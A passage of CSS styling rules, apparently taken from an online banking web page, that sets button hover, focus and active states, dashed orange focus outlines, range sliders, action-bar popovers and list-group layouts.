.btn.btn-white:hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn:hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn:hover,
.info-box .message-box .btn:hover:not(.btn-primary),
.sales-area .message-box .btn:hover:not(.btn-primary),
.btn.btn-white:focus,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn:focus,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn:focus,
.info-box .message-box .btn:focus:not(.btn-primary),
.sales-area .message-box .btn:focus:not(.btn-primary),
.btn.btn-white:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn:active,
.info-box .message-box .btn:active:not(.btn-primary),
.sales-area .message-box .btn:active:not(.btn-primary) {
    color: #696969
}

.btn.btn-white:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn:active,
.info-box .message-box .btn:active:not(.btn-primary),
.sales-area .message-box .btn:active:not(.btn-primary) {
    background-color: white;
    border-color: white;
    background-image: none
}

.btn.btn-white.disabled:hover,
.btn.btn-white.disabled:focus,
.btn.btn-white.disabled:active,
.btn.btn-white[disabled]:hover,
.btn.btn-white[disabled]:focus,
.btn.btn-white[disabled]:active,
fieldset[disabled] .btn.btn-white:hover,
fieldset[disabled] .btn.btn-white:focus,
fieldset[disabled] .btn.btn-white:active {
    background-color: white;
    border-color: #696969
}

.btn.btn-white:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn:active,
.info-box .message-box .btn:active:not(.btn-primary),
.sales-area .message-box .btn:active:not(.btn-primary) {
    background-color: rgb(232.5, 232.5, 232.5);
    border-color: rgb(232.5, 232.5, 232.5);
    color: #333333
}

.btn.btn-white:hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn:hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn:hover,
.info-box .message-box .btn:hover:not(.btn-primary),
.sales-area .message-box .btn:hover:not(.btn-primary) {
    background-color: #D9D9D9;
    border-color: #D9D9D9 !important;
    color: #333333 !important
}

.btn.btn-white:not(:focus):hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn:not(:focus):hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn:not(:focus):hover,
.info-box .message-box .btn:not(:focus):hover:not(.btn-primary),
.sales-area .message-box .btn:not(:focus):hover:not(.btn-primary) {
    box-shadow: none
}

.btn.btn-sm.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:after,
.info-box .message-box .btn.btn-sm:not(.btn-primary):after,
.sales-area .message-box .btn.btn-sm:not(.btn-primary):after,
.btn-group-sm>.btn.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:after,
.info-box .message-box .btn-group-sm>.btn:not(.btn-primary):after,
.sales-area .message-box .btn-group-sm>.btn:not(.btn-primary):after,
.btn.btn-sm.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:before,
.info-box .message-box .btn.btn-sm:not(.btn-primary):before,
.sales-area .message-box .btn.btn-sm:not(.btn-primary):before,
.btn-group-sm>.btn.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:before,
.info-box .message-box .btn-group-sm>.btn:not(.btn-primary):before,
.sales-area .message-box .btn-group-sm>.btn:not(.btn-primary):before,
.btn.btn-xs.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:after,
.info-box .message-box .btn.btn-xs:not(.btn-primary):after,
.sales-area .message-box .btn.btn-xs:not(.btn-primary):after,
.btn-group-xs>.btn.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:after,
.info-box .message-box .btn-group-xs>.btn:not(.btn-primary):after,
.sales-area .message-box .btn-group-xs>.btn:not(.btn-primary):after,
.btn.btn-xs.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:before,
.info-box .message-box .btn.btn-xs:not(.btn-primary):before,
.sales-area .message-box .btn.btn-xs:not(.btn-primary):before,
.btn-group-xs>.btn.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:before,
.info-box .message-box .btn-group-xs>.btn:not(.btn-primary):before,
.sales-area .message-box .btn-group-xs>.btn:not(.btn-primary):before {
    content: "";
    position: absolute;
    left: 3px;
    right: 3px;
    bottom: 3px;
    top: 3px;
    border-radius: 19px;
    padding-top: 5px;
    padding-right: 19px;
    padding-bottom: 5px;
    padding-left: 19px;
    opacity: 0;
    transition: 0.3s ease-in-out
}

.btn.btn-sm.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:before,
.info-box .message-box .btn.btn-sm:not(.btn-primary):before,
.sales-area .message-box .btn.btn-sm:not(.btn-primary):before,
.btn-group-sm>.btn.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:before,
.info-box .message-box .btn-group-sm>.btn:not(.btn-primary):before,
.sales-area .message-box .btn-group-sm>.btn:not(.btn-primary):before,
.btn.btn-xs.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:before,
.info-box .message-box .btn.btn-xs:not(.btn-primary):before,
.sales-area .message-box .btn.btn-xs:not(.btn-primary):before,
.btn-group-xs>.btn.btn-white:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:before,
.info-box .message-box .btn-group-xs>.btn:not(.btn-primary):before,
.sales-area .message-box .btn-group-xs>.btn:not(.btn-primary):before {
    background-position: center;
    background-repeat: no-repeat;
    background: url(data:image/svg+xml,%3csvg\ width=\'100%25\'\ height=\'100%25\'\ xmlns=\'http://www.w3.org/2000/svg\'%3e%3crect\ width=\'100%25\'\ height=\'100%25\'\ fill=\'none\'\ rx=\'14\'\ ry=\'14\'\ stroke=\'%23ff6200\'\ stroke-width=\'2\'\ stroke-dasharray=\'1%2c1\'\ stroke-dashoffset=\'0\'\ stroke-linecap=\'butt\'/%3e%3c/svg%3e)
}

.btn.btn-sm.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:after,
.info-box .message-box .btn.btn-sm:not(.btn-primary):after,
.sales-area .message-box .btn.btn-sm:not(.btn-primary):after,
.btn-group-sm>.btn.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:after,
.info-box .message-box .btn-group-sm>.btn:not(.btn-primary):after,
.sales-area .message-box .btn-group-sm>.btn:not(.btn-primary):after,
.btn.btn-xs.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:after,
.info-box .message-box .btn.btn-xs:not(.btn-primary):after,
.sales-area .message-box .btn.btn-xs:not(.btn-primary):after,
.btn-group-xs>.btn.btn-white:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:after,
.info-box .message-box .btn-group-xs>.btn:not(.btn-primary):after,
.sales-area .message-box .btn-group-xs>.btn:not(.btn-primary):after {
    border: 2px solid #FF6200
}

.btn.btn-sm.btn-white:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:active,
.info-box .message-box .btn.btn-sm:active:not(.btn-primary),
.sales-area .message-box .btn.btn-sm:active:not(.btn-primary),
.btn-group-sm>.btn.btn-white:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:active,
.info-box .message-box .btn-group-sm>.btn:active:not(.btn-primary),
.sales-area .message-box .btn-group-sm>.btn:active:not(.btn-primary),
.btn.btn-xs.btn-white:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:active,
.info-box .message-box .btn.btn-xs:active:not(.btn-primary),
.sales-area .message-box .btn.btn-xs:active:not(.btn-primary),
.btn-group-xs>.btn.btn-white:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:active,
.info-box .message-box .btn-group-xs>.btn:active:not(.btn-primary),
.sales-area .message-box .btn-group-xs>.btn:active:not(.btn-primary) {
    background-color: rgb(255, 160.8, 102) !important;
    border-color: rgb(255, 160.8, 102) !important;
    color: #fff !important
}

.btn.btn-sm.btn-white:active icon svg path,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:active icon svg path,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:active icon svg path,
.info-box .message-box .btn.btn-sm:active:not(.btn-primary) icon svg path,
.sales-area .message-box .btn.btn-sm:active:not(.btn-primary) icon svg path,
.btn-group-sm>.btn.btn-white:active icon svg path,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:active icon svg path,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:active icon svg path,
.info-box .message-box .btn-group-sm>.btn:active:not(.btn-primary) icon svg path,
.sales-area .message-box .btn-group-sm>.btn:active:not(.btn-primary) icon svg path,
.btn.btn-xs.btn-white:active icon svg path,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:active icon svg path,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:active icon svg path,
.info-box .message-box .btn.btn-xs:active:not(.btn-primary) icon svg path,
.sales-area .message-box .btn.btn-xs:active:not(.btn-primary) icon svg path,
.btn-group-xs>.btn.btn-white:active icon svg path,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:active icon svg path,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:active icon svg path,
.info-box .message-box .btn-group-xs>.btn:active:not(.btn-primary) icon svg path,
.sales-area .message-box .btn-group-xs>.btn:active:not(.btn-primary) icon svg path {
    fill: #FFF
}

.btn.btn-sm.btn-white:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active),
.info-box .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):not(.btn-primary),
.sales-area .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):not(.btn-primary),
.btn-group-sm>.btn.btn-white:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active),
.info-box .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):not(.btn-primary),
.sales-area .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):not(.btn-primary),
.btn.btn-xs.btn-white:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active),
.info-box .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):not(.btn-primary),
.sales-area .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):not(.btn-primary),
.btn-group-xs>.btn.btn-white:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active),
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active),
.info-box .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):not(.btn-primary),
.sales-area .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):not(.btn-primary) {
    border-color: #FF6200
}

.btn.btn-sm.btn-white:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):focus,
.info-box .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):focus:not(.btn-primary),
.sales-area .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):focus:not(.btn-primary),
.btn-group-sm>.btn.btn-white:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus,
.info-box .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary),
.sales-area .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary),
.btn.btn-xs.btn-white:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):focus,
.info-box .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):focus:not(.btn-primary),
.sales-area .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):focus:not(.btn-primary),
.btn-group-xs>.btn.btn-white:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus,
.info-box .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary),
.sales-area .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary) {
    box-shadow: none !important;
    border-color: #FF6200 !important
}

.btn.btn-sm.btn-white:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):focus:after,
.info-box .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after,
.sales-area .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after,
.btn-group-sm>.btn.btn-white:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus:after,
.info-box .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after,
.sales-area .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after,
.btn.btn-xs.btn-white:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):focus:after,
.info-box .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after,
.sales-area .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after,
.btn-group-xs>.btn.btn-white:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus:after,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus:after,
.info-box .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after,
.sales-area .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):focus:not(.btn-primary):after {
    opacity: 1;
    transition: 0.3s ease-in-out
}

.btn.btn-sm.btn-white:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):hover,
.info-box .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):hover:not(.btn-primary),
.sales-area .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):hover:not(.btn-primary),
.btn-group-sm>.btn.btn-white:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover,
.info-box .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary),
.sales-area .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary),
.btn.btn-xs.btn-white:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):hover,
.info-box .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):hover:not(.btn-primary),
.sales-area .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):hover:not(.btn-primary),
.btn-group-xs>.btn.btn-white:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover,
.info-box .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary),
.sales-area .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary) {
    box-shadow: none !important;
    color: #696969 !important;
    border-color: #FF6200 !important;
    background-color: #FFF
}

.btn.btn-sm.btn-white:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-sm:not(.disabled):not(.active):not(:active):hover:before,
.info-box .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before,
.sales-area .message-box .btn.btn-sm:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before,
.btn-group-sm>.btn.btn-white:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover:before,
.info-box .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before,
.sales-area .message-box .btn-group-sm>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before,
.btn.btn-xs.btn-white:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.btn-xs:not(.disabled):not(.active):not(:active):hover:before,
.info-box .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before,
.sales-area .message-box .btn.btn-xs:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before,
.btn-group-xs>.btn.btn-white:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover:before,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover:before,
.info-box .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before,
.sales-area .message-box .btn-group-xs>.btn:not(.disabled):not(.active):not(:active):hover:not(.btn-primary):before {
    opacity: 1;
    transition: 0.3s ease-in-out
}
</style>
<style>
.btn.selectable:focus {
    border-color: #A8A8A8
}

.btn.selectable:focus.activeitem,
.btn.selectable:focus .selected {
    border-color: #FF6200
}

.btn.btn-luxtrust-square:hover {
    background-color: #f6f6f7;
    border-color: #A8A8A8
}

.btn.btn-luxtrust-square:active {
    background-color: #f9f9f9
}

.btn.btn-full-width:after {
    content: "";
    display: table;
    clear: both
}

.btn.btn-full-width:hover {
    background-color: #f6f6f7;
    border-color: #A8A8A8
}

.btn.btn-full-width:active {
    background-color: #f9f9f9;
    color: #696969
}

.btn.dropdown-toggle.btn-white:hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.dropdown-toggle:hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.dropdown-toggle:hover,
.info-box .message-box .btn.dropdown-toggle:hover:not(.btn-primary),
.sales-area .message-box .btn.dropdown-toggle:hover:not(.btn-primary) {
    background-color: #F0F0F0 !important
}

.btn.btn-image:after {
    content: "";
    display: table;
    clear: both
}

.btn.btn-image:before {
    content: "";
    display: block;
    width: 77px;
    height: 77px;
    border-radius: 39px;
    border: 1px solid #A8A8A8;
    background-color: #f9f9f9;
    position: absolute;
    left: -64px;
    top: 50%;
    margin-top: -39px;
    z-index: -1;
    transition: background-color 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946);
    cursor: pointer
}

.btn.btn-image:hover {
    background-color: #f6f6f7;
    border-color: #A8A8A8
}

.btn.btn-image:hover:before {
    background-color: #f6f6f7
}

@media (min-width:768px) {
    .btn.btn-align-right:after {
        content: "";
        display: table;
        clear: both
    }
}

.btn.btn-link:hover,
.btn.btn-link:focus,
.btn.btn-link:active {
    background: transparent;
    font-weight: bold !important;
    color: #FF6200;
    border-color: transparent;
    text-decoration: underline
}

@-webkit-viewport {
    width: device-width
}

@-moz-viewport {
    width: device-width
}

@-ms-viewport {
    width: device-width
}

@-o-viewport {
    width: device-width
}

@viewport {
    width: device-width
}

.ngrs-range-slider:before {
    display: block;
    width: 100%;
    height: 3px;
    background-color: #A8A8A8;
    content: " ";
    position: relative;
    top: 15px
}

.ngrs-range-slider .ngrs-handle:after {
    display: block;
    content: " ";
    width: 70px;
    height: 70px;
    position: absolute;
    left: 50%;
    top: 50%;
    margin-left: -35px;
    margin-top: -45px
}

.ngrs-range-slider .ngrs-min-max-values:after {
    content: "";
    display: table;
    clear: both
}

.ngrs-range-slider .ngrs-attached-handles .ngrs-value:after,
.ngrs-range-slider .ngrs-attached-handles .ngrs-value:before {
    border: solid transparent;
    content: " ";
    height: 0;
    width: 0;
    position: absolute;
    pointer-events: none;
    visibility: visible
}

.ngrs-range-slider .ngrs-attached-handles .ngrs-value:after {
    border-width: 5px;
    z-index: 2;
    border-top-color: #696969;
    bottom: -10px;
    right: 50%;
    margin-right: -5px
}

.ngrs-range-slider .ngrs-attached-handles .ngrs-value:before {
    z-index: 1;
    border-width: 5px;
    border-top-color: #696969;
    bottom: -10px;
    right: 50%;
    margin-right: -5px
}

@media (min-width:1025px) {

    .actionbar-wrapper .actionbar button.action:hover,
    .actionbar-wrapper .actionbar button.action:focus {
        background: #f6f6f7
    }
}

.actionbar-wrapper .actionbar button.action:active {
    background: #A8A8A8;
    transition: none
}

.actionbar-wrapper .popover.has-scroll .popover-scrollpane::-webkit-scrollbar {
    display: none
}

.actionbar-wrapper .popover.has-scroll:after {
    display: block;
    position: absolute;
    height: 40px;
    left: 15px;
    right: 15px;
    z-index: 100;
    bottom: 0;
    content: " ";
    pointer-events: none;
    background-image: linear-gradient(rgba(255, 255, 255, 0), white)
}

.actionbar-wrapper .popover.has-scroll:before {
    display: block;
    position: absolute;
    width: 100%;
    height: 40px;
    left: 0;
    top: 0;
    content: " ";
    pointer-events: none;
    z-index: 1;
    background-image: linear-gradient(white, rgba(255, 255, 255, 0))
}

.actionbar-wrapper .popover.has-scroll:before {
    top: 10px;
    height: 15px
}

.actionbar-wrapper .popover.has-scroll:after {
    bottom: 10px;
    height: 15px
}

.actionbar-wrapper .popover .popover-content button.action:hover,
.actionbar-wrapper .popover .popover-content button.action:focus {
    background: #f6f6f7
}

.actionbar-wrapper .popover .popover-content button.action:active {
    background: #A8A8A8
}

.actionbar-wrapper .popover .popover-scrollpane:after {
    content: "";
    display: table;
    clear: both
}

.top-menu:after,
.top-menu:before {
    border: solid transparent;
    content: " ";
    height: 0;
    width: 0;
    position: absolute;
    pointer-events: none;
    visibility: visible
}

.top-menu:after {
    border-width: 10px;
    z-index: 2;
    border-top-color: white;
    bottom: -20px;
    right: 50%;
    margin-right: -10px
}

.top-menu:before {
    z-index: 1;
    border-width: 11px;
    border-top-color: #A8A8A8;
    bottom: -22px;
    right: 50%;
    margin-right: -11px
}

.top-banner.has-swipe .top-banner-scroller .top-banner-item:active {
    cursor: var(--sf-img-13), auto;
    cursor: -webkit-image-set(var(--sf-img-13) 1x, url(data:,)2x), auto
}

.top-details .pull-right .list-group-item-heading:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    left: -40px;
    top: 0;
    content: " ";
    pointer-events: none;
    box-shadow: -45px 0 30px -30px #f6f6f7 inset;
    transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.top-details .pull-right .list-group-item-heading:after {
    float: right
}

.top-details .pull-right .list-group-item-text:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    left: -40px;
    top: 0;
    content: " ";
    pointer-events: none;
    box-shadow: -45px 0 30px -30px #f6f6f7 inset;
    transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.top-details .pull-right .list-group-item-text:after {
    float: right
}

.list-group .list-group-item .list-group-item-wrapper:after {
    content: "";
    display: table;
    clear: both
}

.list-group .list-group-item .list-group-item-heading.unread:before {
    content: "";
    display: inline-block;
    width: 8px;
    height: 8px;
    margin-right: 5px;
    background-color: #FF6200;
    border-radius: 4px;
    position: relative;
    top: -1px
}

.list-group .list-group-item .pull-right:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    left: -40px;
    top: 0;
    content: " ";
    pointer-events: none;
    box-shadow: -45px 0 30px -30px white inset;
    transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.list-group .list-group-item.no-overflow .pull-right:after {
    display: none !important
}

.list-group .list-group-item .pull-left:after {
    content: "";
    display: table;
    clear: both
}

.list-group .list-group-item .swipe-actions .action:hover,
.list-group .list-group-item .swipe-actions .action:focus {
    text-decoration: none;
    background: rgb(79.5, 79.5, 79.5)
}

.list-group .list-group-item .swipe-actions .action.action-2:hover,
.list-group .list-group-item .swipe-actions .action.action-2:focus {
    background: #cfcfcf
}

.list-group .list-group-item.multi-line .list-group-item-wrapper .pull-right:after {
    display: none
}

.list-group .list-group-item.multi-line .list-group-item-wrapper:hover .pull-right {
    background: none
}

.list-group .list-group-item.multi-line .list-group-item-wrapper:hover .pull-right:after {
    display: none
}

.list-group .list-group-item.action .list-group-item-wrapper .pull-right:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    left: -40px;
    top: 0;
    content: " ";
    pointer-events: none;
    box-shadow: -45px 0 30px -30px #f6f6f7 inset;
    transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.list-group .list-group-item.action .list-group-item-wrapper:hover {
    background: rgb(243.3, 243.3, 244.6)
}

.list-group .list-group-item.action .list-group-item-wrapper:hover .pull-right {
    background: rgb(243.3, 243.3, 244.6)
}

